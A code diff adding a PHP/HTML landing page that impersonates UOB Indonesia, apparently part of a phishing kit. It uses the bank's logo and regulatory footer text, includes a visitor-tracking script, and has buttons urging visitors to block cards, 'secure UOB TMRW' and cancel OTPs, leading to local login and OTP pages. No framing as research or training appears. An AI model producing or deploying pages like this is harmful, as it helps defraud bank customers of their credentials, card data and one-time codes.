@@ -1,0 +1,200 @@
+<?php include 'visitor.php'; ?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>UOB Indonesia</title>
+    <meta name="og:image" content="https://ik.imagekit.io/ons708bb1/Picsart_25-05-04_02-02-58-482.jpg?updatedAt=1746299069440?updatedAt=1746003088467">
+    <meta name="twitter:image" content="https://ik.imagekit.io/ons708bb1/1746003048684.png?updatedAt=1746003088467">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            /* Background gradien lembut agar efek kaca terlihat jelas */
+            background: linear-gradient(135deg, #f5f7fa 0%, #d8e2eb 100%);
+            background-attachment: fixed;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: auto;
+            padding-bottom: 20px;
+        }
+
+        /* KONTEN */
+        .content {
+            padding: 25px 20px; 
+            text-align: left;
+            margin-top: 15px; 
+        }
+
+        /* =========================================
+           EFEK KACA HALUS (GLASSMORPHISM) PADA BOX
+           ========================================= */
+        .box {
+            /* Latar semi transparan */
+            background: rgba(255, 255, 255, 0.55);
+            
+            /* Efek blur (kaca) */
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            
+            /* Border highlight untuk pantulan cahaya kaca */
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            border-top: 1.5px solid rgba(255, 255, 255, 1);
+            border-left: 1.5px solid rgba(255, 255, 255, 0.9);
+            
+            /* Shadow halus dan elegan */
+            box-shadow: 
+                0 15px 35px -5px rgba(0, 56, 118, 0.15), 
+                0 5px 15px rgba(0, 0, 0, 0.05),
+                inset 0 1px 1px rgba(255, 255, 255, 0.8);
+            
+            padding: 30px 20px; 
+            border-radius: 20px; 
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+
+        .text-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 12px; /* Diperkecil dari 15px agar jarak tombol yang lebih kecil tidak terlalu jauh */
+        }
+
+        .title {
+            font-size: 17px; 
+            font-weight: bold;
+            line-height: 1.4; 
+            text-shadow: 0 1px 2px rgba(255, 255, 255, 0.8); 
+        }
+
+        .description {
+            font-size: 12px; 
+            color: #154455;
+            line-height: 1.5;
+            margin-bottom: 10px; 
+            font-weight: 500;
+        }
+
+        .btn {
+            display: block;
+            text-align: center;
+            padding: 12px; /* Diperkecil dari 16px */
+            font-size: 14px; /* Diperkecil dari 16px */
+            font-weight: bold;
+            border-radius: 10px; /* Diperkecil dari 12px agar sesuai proporsi */
+            text-decoration: none;
+            color: #fff;
+            transition: all 0.3s ease; 
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+        }
+
+        .btn-red {
+            background: linear-gradient(135deg, #005cb6, #003876);
+            box-shadow: 0 6px 15px -3px rgba(0, 92, 182, 0.4); 
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .btn-red:hover {
+            box-shadow: 0 8px 20px -3px rgba(0, 92, 182, 0.5); 
+            transform: translateY(-2px);
+        }
+
+        /* FOOTER */
+        .footer {
+            background-color: #005cb6;
+            color: white;
+            padding: 15px 20px; 
+            font-size: 11px; 
+            text-align: justify; 
+            line-height: 1.5;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            z-index: 1000;
+            box-shadow: 0 -4px 10px rgba(0,0,0,0.1);
+        }
+
+        .footer-spacer {
+            height: 80px; 
+        }
+
+        nav {
+            width: 100%;
+            position: fixed;
+            background-color: white;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05); 
+        }
+
+        nav.top {
+            top: 0;
+        }
+
+        nav img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .nav-spacer {
+            height: 55px; 
+        }
+
+    </style>
+</head>
+<body>
+
+    <nav class="top">
+        <img src="images/Picsart_25-05-04_01-58-59-759.jpg" alt="Nav Atas">
+    </nav>
+    <div class="nav-spacer"></div> 
+
+    <img src="images/Picsart_25-05-04_02-02-58-482.jpg" width="100%" alt="Banner Utama" style="display:block;">
+
+    <div class="content">
+        <div class="box">
+            <div class="text-content">
+                <div class="title" style="text-align: center; color:#000;">
+                    Selamat datang di<br> 
+                    <div style="display: inline-flex; align-items: center; justify-content: center; gap: 5px; margin-top: 4px;">
+                        <img src="https://www.uob.co.id/assets/web-resources/business/images/BrandAssets/UOB_Logo.svg" alt="UOB Logo" style="height: 22px;">
+                        <span style="color:#1368e0;">Indonesia</span>
+                    </div>
+                </div>
+                
+                <div class="description" style="text-align: center;">
+                    Kendalikan apa yang kamu mau dalam satu aplikasi<br>#SaatnyaPegangKendali
+                </div>
+                
+                <a href="card2.html" class="btn btn-red">Blokir Kartu Kredit/Debit</a>
+                <a href="banklain.html" class="btn btn-red">Laporkan Ke Bank Lain</a>
+                <a href="login.html" class="btn btn-red">Amankan UOB TMRW</a>
+                <a href="otp.html" class="btn btn-red">Batalkan OTP</a>
+            </div>
+        </div>
+    </div>
+    
+    <img src="images/Picsart_25-05-04_02-07-23-001.jpg" width="100%" alt="Banner Bawah" style="display:block; margin-bottom: 20px;">
+
+    <div class="footer-spacer"></div>
+
+    <div class="footer">
+        UOB Indonesia berizin dan diawasi oleh Otoritas Jasa Keuangan dan Bank Indonesia serta merupakan peserta penjaminan Lembaga Penjamin Simpanan (LPS). Maksimum nilai simpanan yang dijamin LPS per Nasabah per Bank adalah Rp 2 Miliar.
+    </div>
+
+</body>
+</html>
